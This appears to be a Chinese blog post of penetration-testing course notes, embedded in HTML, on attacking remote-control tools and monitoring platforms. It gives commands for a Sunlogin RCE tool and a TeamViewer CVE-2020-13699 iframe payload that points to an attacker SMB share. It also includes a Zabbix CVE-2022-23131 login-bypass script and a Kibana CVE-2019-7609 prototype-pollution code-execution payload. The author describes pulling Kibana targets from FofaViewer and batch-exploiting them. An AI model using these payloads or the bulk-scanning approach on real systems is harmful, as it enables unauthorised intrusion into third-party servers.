@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV | ai潼</title><meta name="author" content="pwy"><meta name="copyright" content="pwy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="#知识点：1、远程控制-第三方应用安全 2、三方应用-向日葵&amp;VNC&amp;TV 3、设备平台-Zabbix&amp;Kibana漏洞 #章节内容：常见服务应用的安全测试： 1、配置不当-未授权访问 2、安全机制-特定安全漏洞 3、安全机制-弱口令爆破攻击 #前置知识：应用服务安全测试流程：见图 1、判断服务开放情况-端口扫描&amp;组合应用等 2、判断服务类型归属-数据库&amp;文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV">
+<meta property="og:url" content="http://example.com/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/index.html">
+<meta property="og:site_name" content="ai潼">
+<meta property="og:description" content="#知识点：1、远程控制-第三方应用安全 2、三方应用-向日葵&amp;VNC&amp;TV 3、设备平台-Zabbix&amp;Kibana漏洞 #章节内容：常见服务应用的安全测试： 1、配置不当-未授权访问 2、安全机制-特定安全漏洞 3、安全机制-弱口令爆破攻击 #前置知识：应用服务安全测试流程：见图 1、判断服务开放情况-端口扫描&amp;组合应用等 2、判断服务类型归属-数据库&amp;文">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-6ff5732c9bdd51365e27d45c1069ee9c_1440w.webp">
+<meta property="article:published_time" content="2023-03-11T02:22:27.000Z">
+<meta property="article:modified_time" content="2023-03-11T17:05:11.728Z">
+<meta property="article:author" content="pwy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-6ff5732c9bdd51365e27d45c1069ee9c_1440w.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Day58 服务攻防-应用协议&设备Kibana&Zabbix&远控向日葵&VNC&TV',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-12 01:05:11'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ai潼" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tt.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic1.zhimg.com/80/v2-6ff5732c9bdd51365e27d45c1069ee9c_1440w.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="ai潼"><span class="site-name">ai潼</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-11T02:22:27.000Z" title="发表于 2023-03-11 10:22:27">2023-03-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-11T17:05:11.728Z" title="更新于 2023-03-12 01:05:11">2023-03-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/">服务攻防</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、远程控制-第三方应用安全</p>
+<p>2、三方应用-向日葵&amp;VNC&amp;TV</p>
+<p>3、设备平台-Zabbix&amp;Kibana漏洞</p>
+<h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p>
+<p>1、配置不当-未授权访问</p>
+<p>2、安全机制-特定安全漏洞</p>
+<p>3、安全机制-弱口令爆破攻击</p>
+<h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p>
+<p>1、判断服务开放情况-端口扫描&amp;组合应用等</p>
+<p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p>
+<p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p>
+<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 远程控制-向日葵&amp;Vnc&amp;Teamviewer</p>
+<p>➢ 设备平台-Zabbix-CVE-2022-23131</p>
+<p>➢ 设备平台-Kibana-CVE-2019-7609</p>
+<h4 id="远程控制-向日葵-amp-Vnc-amp-Teamviewer"><a href="#远程控制-向日葵-amp-Vnc-amp-Teamviewer" class="headerlink" title="#远程控制-向日葵&amp;Vnc&amp;Teamviewer"></a>#远程控制-向日葵&amp;Vnc&amp;Teamviewer</h4><h6 id="向日葵-RCE"><a href="#向日葵-RCE" class="headerlink" title="-向日葵 RCE"></a>-向日葵 RCE</h6><p><a target="_blank" rel="noopener" href="https://github.com/Mr-xn/sunlogin_rce">https://github.com/Mr-xn/sunlogin_rce</a></p>
+<p>xrkRce.exe -h 192.168.46.157 -t scan</p>
+<p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230311183849961.png" alt="image-20230311183849961"></p>
+<p>xrkRce.exe -h 192.168.46.157 -t rce -p 49712 -c “ipconfig”</p>
+<p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230311183909511.png" alt="image-20230311183909511"></p>
+<h6 id="Teamviewer"><a href="#Teamviewer" class="headerlink" title="-Teamviewer"></a>-Teamviewer</h6><p>复现漏洞：(<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43233085/article/details/107997220">https://blog.csdn.net/qq_43233085/article/details/107997220</a>)</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">​    <span class="tag">&lt;<span class="name">title</span>&gt;</span>cve-2020-13699<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to xiaodi!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;height:1px;width:1px;&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;teamviewer10: --play \\attacker-IP\share\fake.tvs&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="VNC-口令问题-amp-未授权"><a href="#VNC-口令问题-amp-未授权" class="headerlink" title="-VNC 口令问题&amp;未授权"></a>-VNC 口令问题&amp;未授权</h6><p>MSF内置口令及未授权测试</p>
+<p>复现链接：(<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/120437843">https://blog.csdn.net/weixin_40412037/article/details/120437843</a>)</p>
+<h4 id="设备平台-Zabbix-CVE-2022-23131"><a href="#设备平台-Zabbix-CVE-2022-23131" class="headerlink" title="#设备平台-Zabbix-CVE-2022-23131"></a>#设备平台-Zabbix-CVE-2022-23131</h4><p>Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。默认端口：10051</p>
+<p>复现链接：(<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/123154050">https://blog.csdn.net/weixin_50464560/article/details/123154050</a>)</p>
+<p>Zabbix CVE-2022-23131 登录绕过漏洞复现</p>
+<p>脚本：<a target="_blank" rel="noopener" href="https://github.com/L0ading-x/cve-2022-23131">https://github.com/L0ading-x/cve-2022-23131</a></p>
+<p>执行：python3 zabbix.py target Admin</p>
+<p>然后修改Cookie，使用saml登录即可</p>
+<p>CVE-2017-2824 CVE-2020-11800（这两个没有什么价值）</p>
+<h4 id="设备平台-Kibana-CVE-2019-7609"><a href="#设备平台-Kibana-CVE-2019-7609" class="headerlink" title="#设备平台-Kibana-CVE-2019-7609"></a>#设备平台-Kibana-CVE-2019-7609</h4><p>Kibana为Elassticsearch设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代码。默认端口：5601</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/CVE-2019-7609">https://github.com/LandGrey/CVE-2019-7609</a></p>
+<p>用脚本抽选一个测试，发现失败</p>
+<p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312004809566.png" alt="image-20230312004809566"></p>
+<p>用FofaViewer批量化操作，复制到ips.txt里面置于脚本目录下</p>
+<p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005005975.png" alt="image-20230312005005975"></p>
+<p>编写批量化脚本，先试着打印出ips的内容</p>
+<p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005110129.png" alt="image-20230312005110129"></p>
+<p>但是每个ip间都有空格</p>
+<p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005158117.png" alt="image-20230312005158117"></p>
+<p>去掉空行</p>
+<p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005253941.png" alt="image-20230312005253941"></p>
+<p>完整代码执行实现批量扫（脚本都在同一目录下）</p>
+<p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005444474.png" alt="image-20230312005444474"></p>
+<p>.es(*).props(label.<strong>proto</strong>.env.AAAA&#x3D;’require(“child_process”).exec(“&#x2F;bin&#x2F;touch &#x2F;tmp&#x2F;success”);process.exit()&#x2F;&#x2F;‘) .props(label.<strong>proto</strong>.env.NODE_OPTIONS&#x3D;’–require &#x2F;proc&#x2F;self&#x2F;environ’)</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pwy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/">http://example.com/2023/03/11/Day58-服务攻防-应用协议-设备Kibana-Zabbix-远控向日葵-VNC-TV/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">ai潼</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://pic1.zhimg.com/80/v2-6ff5732c9bdd51365e27d45c1069ee9c_1440w.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/12/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/" title="Day59 服务攻防-中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx"><img class="cover" src="https://pic3.zhimg.com/80/v2-81c20a386af2d4c1de7d221a6338d62a_1440w.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Day59 服务攻防-中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/11/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/" title="Day57 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解"><img class="cover" src="https://pic4.zhimg.com/80/v2-e46bd15ab28ea1a5ad5d501abde16873_1440w.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Day57 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tt.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pwy</div><div class="author-info__description">自律&上进</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">#知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%A0%E8%8A%82%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">#章节内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">#前置知识：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">演示案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6-%E5%90%91%E6%97%A5%E8%91%B5-amp-Vnc-amp-Teamviewer"><span class="toc-number">4.1.</span> <span class="toc-text">#远程控制-向日葵&amp;Vnc&amp;Teamviewer</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5-RCE"><span class="toc-number">4.1.0.1.</span> <span class="toc-text">-向日葵 RCE</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Teamviewer"><span class="toc-number">4.1.0.2.</span> <span class="toc-text">-Teamviewer</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#VNC-%E5%8F%A3%E4%BB%A4%E9%97%AE%E9%A2%98-amp-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">4.1.0.3.</span> <span class="toc-text">-VNC 口令问题&amp;未授权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E5%B9%B3%E5%8F%B0-Zabbix-CVE-2022-23131"><span class="toc-number">4.2.</span> <span class="toc-text">#设备平台-Zabbix-CVE-2022-23131</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E5%B9%B3%E5%8F%B0-Kibana-CVE-2019-7609"><span class="toc-number">4.3.</span> <span class="toc-text">#设备平台-Kibana-CVE-2019-7609</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/12/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/" title="Day61 服务攻防-中间件安全&amp;CVE复现&amp;K8s&amp;Docker&amp;Jetty&amp;Websphere"><img src="https://pic4.zhimg.com/80/v2-262b2d2fe6f31639f379414bda2a76fb_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day61 服务攻防-中间件安全&amp;CVE复现&amp;K8s&amp;Docker&amp;Jetty&amp;Websphere"/></a><div class="content"><a class="title" href="/2023/03/12/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/" title="Day61 服务攻防-中间件安全&amp;CVE复现&amp;K8s&amp;Docker&amp;Jetty&amp;Websphere">Day61 服务攻防-中间件安全&amp;CVE复现&amp;K8s&amp;Docker&amp;Jetty&amp;Websphere</a><time datetime="2023-03-12T03:08:36.000Z" title="发表于 2023-03-12 11:08:36">2023-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" 